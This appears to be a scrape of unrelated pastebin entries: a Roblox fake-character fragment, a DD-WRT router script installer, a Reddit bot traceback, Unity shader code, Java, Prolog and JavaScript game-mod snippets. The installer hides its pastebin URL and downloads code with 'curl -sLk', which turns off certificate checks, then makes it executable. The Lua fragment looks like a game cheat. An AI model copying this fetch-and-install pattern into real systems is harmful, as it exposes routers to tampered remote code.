for i,v in next, fakechar:GetDescendants() do
if v:IsA(""BasePart"") then
v.Transparency = 1
end
end
 
fakechar.Humanoid.Died:Connect(function()
   game.Players.LocalPlayer.Character = char
   char:BreakJoints()
   fakechar:Destroy()
kill = true
 
game.Players.LocalPlayer.Character = fakechar"
e9rj1uTV,ddwrt-installer.sh,hes21,Bash,Saturday 8th of July 2023 12:51:50 AM CDT,"#!/bin/sh
#set -x # uncomment/comment to enable/disable debug mode

#     name: ddwrt-installer.sh
#  version: 3.0.1, 15-aug-2022, by eibgrad
#  purpose: install pastebin script into dd-wrt router

# function usage()
usage() {
    echo 'Usage: ddwrt-installer.sh [options] pastebin-id [ext=sh]'
    echo
    echo '  Install pastebin script into dd-wrt router.'
    echo
    echo '  Installation directory hierarchy:'
    echo '    </path> (from --dir option)'
    echo '    /jffs/etc/config'
    echo '    /tmp'
    echo
    echo '  Options:'
    echo '    --dir PATH  installation directory (created as necessary)'
    echo ""    --pre NUM   add prefix to filename (e.g., '01')""
    echo '    --nocom     remove blank lines and non-functional comments'
    echo '    --comp      same as --nocom, plus remove leading whitespace'
    echo '    --noprompt  silently overwrite files and accept defaults'
    echo '    --debug     install script w/ debugging mode enabled'
    echo '    -h,--help   this usage information'
    echo
    echo '  # e.g., install script w/o comments and w/ bash (sh) extension'
    echo '  ddwrt-installer.sh --nocom MxA19W1M'
    echo
}

# function query( message [default-reply] )
query() {
    local reply

    read -p ""$1 "" reply < /dev/tty
    [ ""$reply"" ] && echo ""$reply"" || echo ""$2""
}

# function is_mounted( mounting-point )
is_mounted() { df | grep -Eq ""[[:space:]]+${1}$""; }

# function customize()
customize() {
    # function _ddwrt_ovpn_split()
    _ddwrt_ovpn_split() {
        local route_up
        local route_down
        local default_vpn

        # function __add_directives()
        __add_directives() {
            local CONFIG='openvpncl_config'
            local TEMPF=""/tmp/ddwrt-installer.$$.tmp""

            # retrieve current openvpn client config
            nvram get $CONFIG | tr -d '\r' > $TEMPF

            # delete any matching/competing directives (active or inactive)
            sed -r \
                -e '/^([[:space:]]|#|;)*(|--)route-up/d' \
                -e '/^([[:space:]]|#|;)*(|--)route-pre-down/d' \
                -e '/^([[:space:]]|#|;)*(|--)pull-filter.*redirect-gateway/d' \
                -e '/^([[:space:]]|#|;)*(|--)redirect-gateway/d' \
                -e '/^([[:space:]]|#|;)*(|--)redirect-private/d' \
                -i $TEMPF

            # delete old banner header and footer
            sed -i '/ added by ddwrt-installer /d' $TEMPF

            # configure default gateway (wan or vpn)
            local com=""$([ ${default_vpn+x} ] && echo '#')""

            # add our directives
            {
            echo '# --- begin directives added by ddwrt-installer --- #'
            echo ""route-up ${route_up}""
            echo ""route-pre-down ${route_down}""
            echo ""${com}pull-filter ignore redirect-gateway""
            echo ""${com}redirect-private def1""
            echo '# ---- end directives added by ddwrt-installer ---- #'
            } >> $TEMPF

            # delete blank lines
            sed -i '/^[[:space:]]*$/d' $TEMPF

            # update openvpn client config
            nvram set $CONFIG=""$(cat $TEMPF | tr -d '\r')""
            nvram commit &>/dev/null

            rm -f $TEMPF
        }

        if [ ! ${noprompt+x} ]; then
            # obtain openvpn default routing preference (default=lan->wan)
            while :; do
                case ""$(query 'Default routing ([1]=lan->wan 2=lan->vpn)?' '1')"" in
                    '1') break;;
                    '2') default_vpn=; break;;
                esac
            done
        fi

        route_up=""$file_dir/route-up""
        route_down=""$file_dir/route-down""

        # add symbolic links
        ln -sf ""$file"" ""$route_up""
        ln -sf ""$file"" ""$route_down""

        __add_directives
    }

    # script-specific customization (optional)
    case ""$pbid"" in
        'nC27ETsp') _ddwrt_ovpn_split;;
        'W2P3TDZT') _ddwrt_ovpn_split;;
        *) ;;
    esac
}

# function exit_1( [message] )
exit_1() { [ ""$1"" ] && echo ""$1""; exit 1; }

# function exit_0( [message] )
exit_0() { [ ""$1"" ] && echo ""$1""; exit 0; }

# handle help/usage requests
for opt; do case $opt in -h|--help) usage; exit 0;; esac; done

# try curl, fallback to wget
which curl &>/dev/null && GET_URL='curl -sLk' || GET_URL='wget -qO -'

# process command line options/arguments
while [ $# -gt 0 ]; do
    case $1 in
             '--dir') shift; file_dir=""${1//[[:space:]]/}"";;
             '--pre') shift; file_pre=""${1//[[:space:]]/}"";;
           '--nocom') nocom=; unset comp;;
            '--comp') comp=; unset nocom;;
        '--noprompt') noprompt=;;
           '--debug') debug=;;
                   *) break 2;;
    esac
    shift
done

# set pastebin-id
[ ""$1"" ] && pbid=""$1"" || exit_0 'info: nothing to do'

# set and verify extension
ext=""$([ ""$2"" ] && echo ""${2//[[:space:]]/}"" || echo sh)""
echo $ext | grep -q '\.' && exit_1 ""error: extension cannot contain '.'""

# construct pastebin url for retrieving raw file (obscure from hosting site)
url=""$(echo wastebin | sed s/w/p/).com/raw/$pbid""

if [ ! ""$file_dir"" ]; then
    # locate storage
    if is_mounted '/jffs'; then
        file_dir='/jffs/etc/config'
    else
        file_dir='/tmp'
        echo 'warning: /jffs not mounted; using /tmp'
    fi
fi

# convert cryptic pastebin id to common name
case ""$pbid"" in
    'hYwdStCx') file='ddwrt-blacklist-domains';;
    'MxA19W1M') file='ddwrt-dhcp-lease-persist';;
    'VDZ32r2D') file='ddwrt-mount-usb-drives';;
    'TKdKUmY1') file='ddwrt-ovpn-client-killswitch';;
    'iNC273ER') file='ddwrt-ovpn-client-watchdog';;
    'gnxtZuqg') file='ddwrt-ovpn-remote-access';;
    'nC27ETsp') file='ddwrt-ovpn-split-advanced';;
    'W2P3TDZT') file='ddwrt-ovpn-split-basic';;
    '9DUMFJgN') file='ddwrt-pptp-policy-based-routing';;
    'NkKUUjsn') file='ddwrt-ultimate-dns-leak-test';;
    'NUb73JqK') file='ddwrt-wol-port-forward';;
    '2gg5ZdRY') file='importvpncl';;
             *) file=""pastebin-$pbid"";;
esac

# check for existing files
efiles=""$(echo $file_dir/*$file*)""

if [ ! ${noprompt+x} ] && [ ""$efiles"" != ""$file_dir/*$file*"" ]; then
    efile_count=0

    for efile in $efiles; do
        echo ""warning: existing file: $efile""
        let efile_count++
    done

    if [ $efile_count -gt 0 ]; then
        # obtain permission to overwrite existing file(s)
        while :; do
            case ""$(query 'Overwrite existing file(s) (yes/[no])?' 'no')"" in
                'yes') break;;
                 'no') exit_0 'info: installation aborted';;
            esac
        done

        # delete existing files
        for efile in $efiles; do rm -f $efile; done
    fi
fi

# option pre: add prefix to filename
[ ""$file_pre"" ] && file=""${file_pre}-$file""

# create directory
if ! mkdir -p ""$file_dir"" 2>/dev/null; then
    exit_1 ""error: cannot create directory: $file_dir""
fi

# construct full path + filename + extension
file=""$file_dir/$file.$ext""

# confirm file can be created through initialization
if ! (> ""$file"") 2>/dev/null; then
    exit_1 ""error: cannot create file: $file""
fi

# retrieve raw file from pastebin
$GET_URL $url | tr -d '\r' > ""$file""; echo >> ""$file""

# verify file is bash script by locating shebang
if ! head -n1 ""$file"" | grep -Eq '^#!/bin/sh($|[[:space:]]+)'; then
    rm -f ""$file""
    exit_1 ""error: file not found: $pbid""
fi

# option nocom: remove blank lines and non-functional comments
[ ${nocom+x} ] && sed -ri '/^[[:space:]]*($|#([[:space:]]|#|$))/d' ""$file""

# option comp: same as --nocom, plus remove leading whitespace
[ ${comp+x}  ] && sed -ri 's/^[[:space:]]*//;/^($|#([[:space:]]|#|$))/d' ""$file""

# option debug: install script w/ debugging mode enabled
[ ${debug+x} ] && sed -ri '2 s/^#(DEBUG=; )/\1/' ""$file""

# mark file executable
chmod +x ""$file""

# check for any script-specific customization
customize

exit_0 ""installed: $file"""
5y2dgL5V,ResponseException: received 504 HTTP response,Vault-TecTradingCo,Python,Saturday 8th of July 2023 12:38:32 AM CDT,"Traceback (most recent call last):
  File ""main.py"", line 57, in wrapper
    job_func(*args, **kwargs)
  File ""main.py"", line 91, in comment_listener
    database_manager.load_comment(comment, db_conn)
  File ""/root/Fallout76MarketplaceKarmaBot/database_manager.py"", line 162, in load_comment
    if not is_mod(comment.author):
  File ""/root/Fallout76MarketplaceKarmaBot/database_manager.py"", line 25, in is_mod
    moderators_list = get_subreddit_instance(""Fallout76Marketplace"").moderator()
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/models/reddit/subreddit.py"", line 2960, in __call__
    return self.subreddit._reddit.get(url, params=params)
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/reddit.py"", line 595, in get
    return self._objectify_request(method=""GET"", params=params, path=path)
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/reddit.py"", line 696, in _objectify_request
    self.request(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/praw/reddit.py"", line 885, in request
    return self._core.request(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 330, in request
    return self._request_with_retries(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 228, in _request_with_retries
    response, saved_exception = self._make_request(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 185, in _make_request
    response = self._rate_limiter.call(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/rate_limit.py"", line 33, in call
    kwargs[""headers""] = set_header_callback()
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/sessions.py"", line 283, in _set_header_callback
    self._authorizer.refresh()
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/auth.py"", line 425, in refresh
    self._request_token(
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/auth.py"", line 155, in _request_token
    response = self._authenticator._post(url, **data)
  File ""/root/Fallout76MarketplaceKarmaBot/venv/lib/python3.8/site-packages/prawcore/auth.py"", line 38, in _post
    raise ResponseException(response)
prawcore.exceptions.ResponseException: received 504 HTTP response
"
URxWkeBX,Crepuscular Rays,noradninja,C#,Saturday 8th of July 2023 12:28:45 AM CDT,"// Upgrade NOTE: replaced 'mul(UNITY_MATRIX_MVP,*)' with 'UnityObjectToClipPos(*)'


Shader ""Lighting/Crepuscular Rays"" {
	
	Properties{
		_MainTex(""Base (RGB)"", 2D) = ""white"" {}
		_BlurTex(""BlurTex (RGB)"", 2D) = ""white"" {}
		_NumSamples(""Number of Samples"", Range(0, 1024)) = 128
		_Density(""Density"", Range(0, 1)) = 1.0
		_Weight(""Weight"", Range(0, 2)) = 1.0
		_Decay(""Decay"", Range(0, 1)) = 1.0
		_Exposure(""Exposure"", Range(0, 1)) = 1.0
		_Parameter(""Kernel Offset"", Range(0, 4)) = 1.0
		_Contrast(""Contrast"", Range(1, 5)) = 1.0
		_PerpendicularFalloff(""Perpendicular Falloff Rate"", Range(0.01, 1)) = 1.0
		_CosAngle(""Angle"", Float) = 1
		[IntRange] _StencilRef (""Stencil Ref"", Range(0,255)) = 0
		_TintColor (""Tint Color"", Color) = (.5, .5, .5, .5)
		_FrameValue(""Frame remainder"", Float) = 0
		[IntRange] _Frequency (""Frequency"", Range(1,15)) = 1
		_fogInfluence(""Fog Influence"", Range(0,2)) = 0.5
		_fogSpeed(""Fog Speed"", Float) = 10.0
	}
		CGINCLUDE
		#include ""UnityCG.cginc""
		#pragma target 2.0

		uniform sampler2D_half _MainTex;
		uniform sampler2D_half _BlurTex;
		uniform sampler2D _CameraDepthTexture;
		half3 _LightPos;
		half _NumSamples;
		half _Density;
		half _Weight;
		half _Decay;
		half _Exposure;
		half _Contrast;
		uniform half4 _Parameter;
		uniform half4 _MainTex_TexelSize;
		half4 _MainTex_ST;
		half _LightY;
		half _CosAngle;
		half4 _TintColor;
		half _PerpendicularFalloff;
		int _Frequency;
		float _fogInfluence;
		half _fogSpeed;
		

		
		struct appdata
		{
			float4 pos : POSITION;
			float2 uv : TEXCOORD0;
		};

		struct v2f 
		{
			float4 pos : SV_POSITION;
			float2 uv  : TEXCOORD0;
		};

		struct v2f_withBlurCoordsSGX 
		{
			float4 pos : SV_POSITION;
			half2 uv : TEXCOORD0;
			half4 offs[3] : TEXCOORD1;
		};

		static const half curve[7] = { 0.0205, 0.0855, 0.232, 0.324, 0.232, 0.0855, 0.0205 };  // gauss'ish blur weights

		half rand(half2 co)
				{
				    const half a = 2.9898f;
				    const half b = 78.233f;
				    const half c = 28.5453f;
				    const half dt = dot(co.xy ,half2(a,b));
				    const half sn = cos(abs(dt/3.14f));
				    return cos(frac(sin(sn) * c)* ((_Time.w * _fogSpeed) * _fogInfluence));
				}	
////////////// accumulator for rays  /////////////////
		v2f vert( appdata v )
			{
				v2f o;
				o.pos = UnityObjectToClipPos (v.pos);
				o.uv = v.uv;
				return o;
			}
			
			
		half4 frag(v2f i) : COLOR
			{
				// Calculate floattor from pixel to light source in screen space.
				half4 light = half4(_LightPos.xyz,1);
				half2 deltaTexCoord = half2 (0,0);
				// get our y direction, and swap the direction the coordinates are plotted based on that
				// so that it looks correct regardless of current camera rotation- we decompose this
				//because it will not look right if we just add or subtract light.xy to i.uv
				deltaTexCoord = half2(light.y < 0.0h ? half2(i.uv.x + light.x, i.uv.y + light.y) : half2(i.uv.x - light.x, i.uv.y - light.y));

				// Divide by number of samples and scale by control factor.
				deltaTexCoord *= 1.0h / _NumSamples * _Density;
				
				// Store initial sample.
				half2 uv = i.uv;
				half3 color = tex2D(_MainTex, uv);
				
				// Set up illumination decay factor.
				half illuminationDecay = 1.0h;
				
				// Evaluate summation from Equation 3 NUM_SAMPLES iterations.
				float depth;
				half rate = _Frequency;
				
				for (int i = 1; i < _NumSamples + 1; i++)
				{
					// Step sample location along ray.
					uv -= deltaTexCoord;
					// Retrieve sample at new location.
					float sample = tex2D(_MainTex, uv);
					half randomFactor = rand(uv.yx)*_fogInfluence * _Contrast;
					float value = frac(i/rate);
					float cast = Linear01Depth(tex2D(_CameraDepthTexture, uv)).r;
					//calc depth value
					depth = float(value !=0 ? float(cast * 1.5f):float(cast * (1-randomFactor)));
					// Apply sample attenuation scale/decay factors.
					sample *= illuminationDecay * (_Weight/ _NumSamples*4) * depth;
					sample *= 2.5h;
					
					// Accumulate combined color.
					color += sample;
					// Update exponential decay factor.
					illuminationDecay *= _Decay;
				}
				// Output final color with a further scale control factor.
				return (max(half4(color * _Exposure, 1), 0.15h));
			}
/////////////// SGX Horizontal Blur /////////////////////////////		
		v2f_withBlurCoordsSGX vertBlurHorizontalSGX (appdata_img v)
			{
				v2f_withBlurCoordsSGX o;
				o.pos = UnityObjectToClipPos(v.vertex);
				
				o.uv = UnityStereoScreenSpaceUVAdjust(v.texcoord.xy, _MainTex_ST);

				const half offsetMagnitude = _MainTex_TexelSize.x * _Parameter.x;
				o.offs[0] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(-3.0h, 0.0h, 3.0h, 0.0h), _MainTex_ST);
				o.offs[1] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(-2.0h, 0.0h, 2.0h, 0.0h), _MainTex_ST);
				o.offs[2] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(-1.0h, 0.0h, 1.0h, 0.0h), _MainTex_ST);

				return o; 
			}
/////////////// SGX Vertical Blur /////////////////////////////		
		v2f_withBlurCoordsSGX vertBlurVerticalSGX (appdata_img v)
			{
				v2f_withBlurCoordsSGX o;
				o.pos = UnityObjectToClipPos(v.vertex);
				
				o.uv = half4(UnityStereoScreenSpaceUVAdjust(v.texcoord.xy, _MainTex_ST),1,1);

				const half offsetMagnitude = _MainTex_TexelSize.y * _Parameter.x;
				o.offs[0] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(0.0h, -3.0h, 0.0h, 3.0h), _MainTex_ST);
				o.offs[1] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(0.0h, -2.0h, 0.0h, 2.0h), _MainTex_ST);
				o.offs[2] = UnityStereoScreenSpaceUVAdjust(v.texcoord.xyxy + offsetMagnitude * half4(0.0h, -1.0h, 0.0h, 1.0h), _MainTex_ST);

				return o; 
			}
///////////// SGX Frag  //////////////////////////////////////
		half4 fragBlurSGX ( v2f_withBlurCoordsSGX i ) : SV_Target
			{
				half2 uv = i.uv.xy;
				
				half4 color = tex2D(_MainTex, i.uv) * curve[3];
				
				for( int l = 0; l < 3; l++ )  
				{   
					const half4 tapA = tex2D(_MainTex, i.offs[l].xy);
					const half4 tapB = tex2D(_MainTex, i.offs[l].zw); 
					color += (tapA + tapB) * curve[l];
				}
				return color;
			}
/////////////// Composition /////////////////////////////
		v2f vertFinal(appdata i)
			{
				v2f o = (v2f)0;
				UNITY_INITIALIZE_OUTPUT(v2f, o);
				o.pos = UnityObjectToClipPos(i.pos);
				o.uv = (i.uv);
				return o;
			}
			
		half4 fragFinal(v2f i) : SV_Target
			{
				half4 light = half4(_LightPos.xyz,1);
				_CosAngle = 1- abs(cos(light.z));
				const fixed4 col = tex2D(_MainTex, i.uv);
				fixed4 sample = tex2D(_BlurTex, i.uv);
				const fixed contrast = _Contrast;		
				const fixed4 finalSample = (((col) + (sample * 0.4h)) - 0.5h) * contrast + 0.445h; //final sampled color
				const fixed4 finalColor = (col + (col * 0.04h) - 0.01h); //final modulated base color
				fixed4 blitColor = lerp(finalSample, finalColor, (1 - _CosAngle - _PerpendicularFalloff)); //use falloff to fade effect out when _CosAngle nears 1 to mask artifacts 
				return blitColor;
			}

		//
		v2f vertStencil(appdata v)
		{
				v2f o;
				o.pos = UnityObjectToClipPos (v.pos);
				o.uv = v.uv;
				return o;
		}
		half4 fragStencil (v2f i) : SV_Target
		{
			fixed4 col = _TintColor;
			return col;
		}
		
		ENDCG
	////// Passes /////////////////////////////////////////////////////
	SubShader {
		ZTest Always
		Cull Off
		//0- calculate low resolution rays
		
		Pass { 
				CGPROGRAM
				#pragma vertex vert
				#pragma fragment frag
				#pragma fragmentoption ARB_precision_hint_fastest
				ENDCG
			}
			//2- vertical blur
		Pass {
				CGPROGRAM 
				#pragma vertex vertBlurVerticalSGX
				#pragma fragment fragBlurSGX
				#pragma fragmentoption ARB_precision_hint_fastest
				ENDCG
			}	
			
		//3- horizontal Blur
		Pass {		
				CGPROGRAM	
				#pragma vertex vertBlurHorizontalSGX
				#pragma fragment fragBlurSGX
				#pragma fragmentoption ARB_precision_hint_fastest
				ENDCG
			}
		Pass //4- composition 
		{
        	CGPROGRAM
			#pragma vertex vertFinal
			#pragma fragment fragFinal
			#pragma fragmentoption ARB_precision_hint_fastest
			ENDCG
		}
		Pass { 
		Stencil{
			Ref [_StencilRef]
			Comp Equal
			Pass Keep
		}
				CGPROGRAM
				#pragma vertex vertStencil
				#pragma fragment fragStencil
				#pragma fragmentoption ARB_precision_hint_fastest
				ENDCG
			}
	}
}"
dn0K6ftQ,Paths.get(URI) that adds FileSystems,dutoitns,Java,Saturday 8th of July 2023 12:22:34 AM CDT,"/**
 * Developer notes on {@link FileSystemNotFoundException}:
 * ================================================================================================================
 * {@link FileSystemNotFoundException} will be thrown by {@link Paths#get(URI)} if you are trying to load a resource
 * that is located within a Jar.
 * https://stackoverflow.com/questions/15713119/java-nio-file-path-for-a-classpath-resource
 * 
 * {@link java.nio.file.FileSystem} implements {@link Closeable}.  That said, I am not using it inside a
 * <code>try-with-resource</code> statement because the {@link java.nio.file.FileSystem} is only created once - and
 * then other resources in the same area can be loaded with the same {@link java.nio.file.FileSystem}
 * (ie you don't have to repeatedly create and close {@link java.nio.file.FileSystem}s).
 *
 * Also, closing {@link java.nio.file.FileSystem}s are problematic, because the associated {@link Path} can then
 * no longer be used.
 * ================================================================================================================
 */
private static Path getPathFromUri(URI fileUri) {
	Assert.isNotNull(fileUri);
	
	Path fileOrDirectory = null;
	try {
		fileOrDirectory = Paths.get(fileUri);
	} catch (FileSystemNotFoundException e) {
		// Not sure how threadsafe FileSystems are, so being safe, rather than sorry.
		nfsLock.lock();
		try {
			// Try again, maybe another thread has created the required FileSystem
			fileOrDirectory = Paths.get(fileUri);
		} catch (FileSystemNotFoundException fsnfe) {
			// Other threads have not yet created the required FileSystem
			
			if (logger.isInfoEnabled()) {
				logger.info(""Creating a FileSystem for classpath resource: "" + fileUri);
			}
			
			try {
				FileSystems.newFileSystem(fileUri, Collections.<String, Object>emptyMap());
			} catch (IOException ioe) {
				String errorMessage = ""A problem occurred creating a FileSystem for classpath resource: "" + fileUri;
				throw new RuntimeException(errorMessage, ioe);
			}
			
			// Try again, now that the FileSystem has been created
			fileOrDirectory = Paths.get(fileUri);
		} finally {
			nfsLock.unlock();
		}
	}
	return fileOrDirectory;
}
private final static ReentrantLock nfsLock = new ReentrantLock();; // Lock for creating new FileSystems"
3jrSZ5aE,Crepuscular,noradninja,C#,Saturday 8th of July 2023 12:20:00 AM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

[RequireComponent(typeof(Camera))]
[AddComponentMenu(""Effects/Crepuscular Rays"", -1)]
public class Crepuscular : MonoBehaviour
{

	public Material material;
	public GameObject mainLight;
	public RenderTexture stencilRT;
	static readonly int blurTexString = Shader.PropertyToID(""_BlurTex"");
	static readonly int cosAngle = Shader.PropertyToID(""_CosAngle"");
	static readonly int frameValue = Shader.PropertyToID(""_FrameValue"");
	[Range(0, 20)]
	public float blurSize = 3;
	[Range(1, 16)]
	public int resolutionDivisor = 1;

	public static readonly int LightPos = Shader.PropertyToID(""_LightPos"");
	public Vector4 lightVector;
	private static readonly int Parameter = Shader.PropertyToID(""_Parameter"");
	public float cosineAngle;

	private int tick;
	// Start is called before the first frame update
	void Start()
    {
      
    }

	void Update()
	{
		if (tick != 3)
		{
			material.SetFloat(frameValue, 1f);
			tick++;
		//print(""Wait frame "" + tick);
		}
		else

		{
			//print(""Depth tick"");
			material.SetFloat(frameValue, 0f);
			tick = 0;
			
		}
	}
	
	//[ImageEffectOpaque]
	private void OnRenderImage(RenderTexture source, RenderTexture destination)
	{
		var blurTex = RenderTexture.GetTemporary(128, 128, 0, source.format);
		//blurTex.filterMode = FilterMode.Point;
		lightVector =GetComponent<Camera>().WorldToViewportPoint(transform.position - mainLight.transform.forward);
		material.SetVector(LightPos, lightVector);
		Graphics.Blit(source, blurTex, material, 0);
		material.SetTexture(blurTexString, blurTex);

		float widthMod = 1.0f / resolutionDivisor;
	if (blurSize > 0){
		for(int i = 0; i < 1; i++) {
                float iterationOffs = (i*1.0f);
                material.SetVector (Parameter, new Vector4 (blurSize * widthMod + iterationOffs, -blurSize * widthMod - iterationOffs, 0.0f, 0.0f));

                // vertical blur
                RenderTexture rt2 = RenderTexture.GetTemporary(128, 128, 0, source.format);
                rt2.filterMode = FilterMode.Bilinear;
                Graphics.Blit (blurTex, rt2, material, 1);
                RenderTexture.ReleaseTemporary (blurTex);
                blurTex = rt2;

                // horizontal blur
                rt2 = RenderTexture.GetTemporary(128, 128, 0, source.format);
                rt2.filterMode = FilterMode.Bilinear;
                Graphics.Blit (blurTex, rt2, material, 2);
                RenderTexture.ReleaseTemporary (blurTex);
                blurTex = rt2;
		}
	}
		RenderTexture.ReleaseTemporary(blurTex);
		Graphics.Blit(source, destination, material, 3);
	}
}"
WzNVkBhK,Arguments not Instantiated in Calculating RSI,KDLPro,Prolog,Friday 7th of July 2023 11:51:43 PM CDT,"% Goals:
% 1. Implement MACD
% 2. Use 9-day EMA as signal line
% 3. Use RSI.
:- dynamic open_value/1.
:- dynamic close_value/1.
:- dynamic prev_close/1.
:- dynamic ema_9/1.
:- dynamic ema_12/1.
:- dynamic ema_26/1.
:- dynamic total_gain/1.
:- dynamic total_loss/1.
:- dynamic num_candles/1.
:- dynamic isa/2.
:- dynamic macd/1.
:- dynamic trend_is/1.

:- use_module(library(csv)).

read_15m_candles:-
    read_csv_file(""15-min candlesticks.csv"", Rows).

read_csv_file(File, Rows):-
    csv_read_file(File, Rows, [functor(row)]),
    reset,
    process_rows(Rows).

reset:-
    retractall(close_value(_)),
    retractall(open_value(_)),
    assert(close_value(0)),
    assert(open_value(0)),
    retractall(total_gain(_)),
    retractall(total_loss(_)),
    assert(total_gain(0)),
    assert(total_loss(0)),
    retractall(macd(_)),
    init_calculate_ema.

init_calculate_ema:-
    retractall(ema_9(_)),
    asserta(ema_9(0)),
    retractall(ema_12(_)),
    asserta(ema_12(0)),
    retractall(ema_26(_)),
    asserta(ema_26(0)).

process_rows([]):-
    open_value(Open),
    close_value(Close),
    check_candlestick(Open, Close),
    write('done'), nl.
process_rows([Row|Rows]):-
    Row = row(O_val, _, _, C_val),
    retractall(prev_close(_)),
    retract(close_value(Prev_C)),
    retract(open_value(_)),
    assert(prev_close(Prev_C)),
    assert(close_value(C_val)),
    assert(open_value(O_val)),
    check_gain_or_loss,
    add_next_ema(9, C_val),
    add_next_ema(12, C_val),
    add_next_ema(26, C_val),
    add_macd,
    check_trend,
    process_rows(Rows).

check_gain_or_loss:-				
% this is where le error is
    prev_close(Prev_Close),
    close_value(Curr_Close),
    (Prev_Close > Curr_Close ->
        write('more'));
    (Prev_Close < Curr_Close ->
        write('less'));
    (Prev_Close = Curr_Close ->
        write('else')).


add_next_ema(Period, Close):-
    (Period = 9 ->
        retract(ema_9(Prev_Close)),
        M is 2/10,
        Prev_M is 1 - M,
        Prev_Weight is Prev_Close * Prev_M,
        Curr_Weight is Close * M,
        Curr_EMA is Prev_Weight + Curr_Weight,
        asserta(ema_9(Curr_EMA)));
    (Period = 12 ->
        retract(ema_12(Prev_Close)),
        M is 2/13,
        Prev_M is 1 - M,
        Prev_Weight is Prev_Close * Prev_M,
        Curr_Weight is Close * M,
        Curr_EMA is Prev_Weight + Curr_Weight,
        asserta(ema_12(Curr_EMA)));
    (Period = 26 ->
        retract(ema_26(Prev_Close)),
        M is 2/27,
        Prev_M is 1 - M,
        Prev_Weight is Prev_Close * Prev_M,
        Curr_Weight is Close * M,
        Curr_EMA is Prev_Weight + Curr_Weight,
        asserta(ema_26(Curr_EMA)));
    !.

add_macd:-
    ema_12(EMA_12_val),
    ema_26(EMA_26_val),
    MACD is EMA_12_val - EMA_26_val,
    asserta(macd(MACD)).

check_trend:-
    retract(trend_is(Curr_Trend)),
    macd(MACD),
    ema_9(Signal),
    (MACD > Signal, Curr_Trend = bearish ->
        assert(trend_is(going_bullish));
    MACD > Signal ->
        assert(trend_is(bullish));
    MACD < Signal, Curr_Trend = bullish ->
        assert(trend_is(going_bearish));
    MACD < Signal -> 
        assert(trend_is(bearish))).
check_trend:-
    macd(MACD),
    ema_9(Signal),
    (MACD > Signal ->
        assert(trend_is(bullish));
    MACD < Signal -> 
        assert(trend_is(bearish))).

check_candlestick(Open, Close) :-
    retractall(isa(_, _)),
    ( Open < Close -> asserta(isa(candlestick, green))
    ; Open > Close -> asserta(isa(candlestick, red))
    ; Open is Close -> asserta(isa(candlestick, neutral)))."
j66B83SA,Como Verificar Si Una Variable Tiene un Número,NubeColectiva,Python,Friday 7th of July 2023 11:27:46 PM CDT,"numero1 = 250
numero2 = 3.14
numero3 = 12,000.45

print(isinstance(numero2, float))
# True "
cfN9KFAc,"game.mods.sophie.smartBuild(""field"")",sinkir,JavaScript,Friday 7th of July 2023 11:24:53 PM CDT,"if(!game.mods)
{
	game.mods = {};
}
if(!game.mods.sophie)
{
	game.mods.sophie = {};
}


game.mods.sophie.genMyBuildFunction = function ()
{
	var sFunc = game.time.queue.update.toString();
	var asFunc = sFunc.split(""\n"");

	var bFlag_el = false;
	var bFlag_controller = false;
	var sParsed = """";
	for(var i=1;i<asFunc.length;i++)
	{
		if(bFlag_el)
		{
			if(bFlag_controller)
			{
				
			}
			else
			{
				if(asFunc[i].includes(""if(!props.controller){""))
				{
					bFlag_controller = true;
				}
				else
				{
					if(asFunc[i].includes(`""invalid queue item:""`))
					{
						sParsed += asFunc[i].replace(`""invalid queue item:""`,
						`""invalid myBuild item:""`)+""\n"";
					}
					else if(asFunc[i].includes(`props.controller.build(model, 1);`))
					{
						sParsed += asFunc[i].replace(`props.controller.build(model, 1);`,
						`props.controller.build(model, el.value);`)+""\n"";
					}
					else
					{
						sParsed += asFunc[i].replace(`this.game`, `game`)+""\n"";
					}
				}
			}
		}
		else
		{
			if(asFunc[i].includes(""var el = this.queueItems[0];""))
			{
				bFlag_el = true;
			}		
		}
	}


	var sPreText = `
	game.mods.sophie.myBuild = function(sElName, sElType, iValue = 1){
			if(iValue > 1 && game.time.queue.queueNonStackable.includes(sElType) || iValue < 1)
			{
				iValue = 1;
			}
			var el = {""name"":sElName, ""type"":sElType, ""value"":iValue};
	`;


	var sPostText = `
	        if(!props.controller){
				console.error(el.name + "" of "" + el.type + "" no controller found :o"");
				return false;
			}
			if(buyItem){
				props.controller.buyItem(model, el.value,  function(result) {});
			}
			
			
			var changed = false;
			if (Array.isArray(compare)){
				for (var i in compare){
					if (oldVal[compare[i]] != model.metadata[compare[i]]){
						changed = true;
					}
				}
			}else{
				changed = oldVal != model.metadata[compare];
			}
			
			return changed;
	}
	`;

	var sFinalText = sPreText+sParsed+sPostText;
	eval(sFinalText);
}

game.mods.sophie.fillPossibleValues = function ()
{
		
	for(var i=0;i<game.time.queue.queueSourcesArr.length;i++)
	{
		var possibleValues = false;
		switch (game.time.queue.queueSourcesArr[i].name){
			case ""policies"":
				possibleValues = game.managers[3].meta[1].meta.map(arr => arr.name);
				break;
				
			case ""tech"":
				possibleValues = game.managers[3].meta[0].meta.map(arr => arr.name);
				break;

			case ""buildings"":
				possibleValues = game.managers[2].meta[0].meta.map(arr => arr.name);
				break;

			case ""spaceMission"":
